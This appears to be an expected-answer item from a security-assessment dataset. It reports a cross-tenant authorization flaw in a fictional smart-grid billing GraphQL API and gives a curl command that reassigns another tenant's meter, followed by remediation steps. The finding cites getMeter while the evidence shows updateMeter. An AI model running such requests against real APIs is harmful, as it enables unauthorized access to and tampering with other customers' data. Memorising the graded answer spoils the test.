# Expected Response

## System
- Domain: Energy / Utilities / Smart Grid
- System: PowerGrid Customer Billing API
- Example ID: GQL-0114

## Priority Findings

### Finding 1: Smart Grid — Client-Supplied tenantId Enables Cross-Tenant Meter Access (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access

**Summary:**
Per §5.0 (Pattern 1.5 — multi-tenant / cross-tenant access): The `getMeter` resolver trusts the client-supplied `tenantId` filter rather than enforcing the JWT-bound tenant. An attacker from `tenant-9e2c` issued `updateMeter(id: "M-2114", input: {status: "approved", ownerId: "attacker-9e2c14b8"})` against a smart meter belonging to `tenant-14b8`, gaining cross-tenant access to billing and consumption data including `CONFIDENTIAL-9e2c14b8`. In Energy / Smart Grid, this exposes utility billing records, energy consumption patterns, and grid infrastructure data.

**Evidence from HAR:**
- Request: `POST https://api.powergrid-customer-b.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-9e2c`
- Mutation: `updateMeter(id: "M-2114", input: {status: "approved", ownerId: "attacker-9e2c14b8"}) { meterId status }`
- Response `200 OK`: `tenantId: "tenant-14b8"`, `ownerId: "other-user-9e2c14b8"`, `sensitiveField: "CONFIDENTIAL-9e2c14b8"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-9e2c14b8`
- Architecture note: API accepts `tenantId` as a filter argument; resolver trusts client-supplied value rather than JWT.

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.5 | getMeter trusts client tenantId filter |
| HAR request | x-tenant-id | Attacker tenant-9e2c |
| HAR request | input.ownerId | attacker-9e2c14b8 (client-injected) |
| HAR response | tenantId | Cross-tenant tenant-14b8 returned |

## Steps to Reproduce

### Step 1 — updateMeter cross-tenant (HAR)
```bash
curl -s -X POST https://api.powergrid-customer-b.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-9e2c" \
  -d '{"query": "mutation { updateMeter(id: \"M-2114\", input: {status: \"approved\", ownerId: \"attacker-9e2c14b8\"}) { meterId status } }"}'
```
**Vulnerable:** `tenant-14b8` meter data mutated. **Secure:** FORBIDDEN.

## Remediation
1. Remove `tenantId` filter argument from `getMeter`; always derive from `$jwt.tenantId`.
2. Resolver: `WHERE meter_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `MeterInput`.
4. Redis cache key: `meter:{tenantId}:{meterId}`.
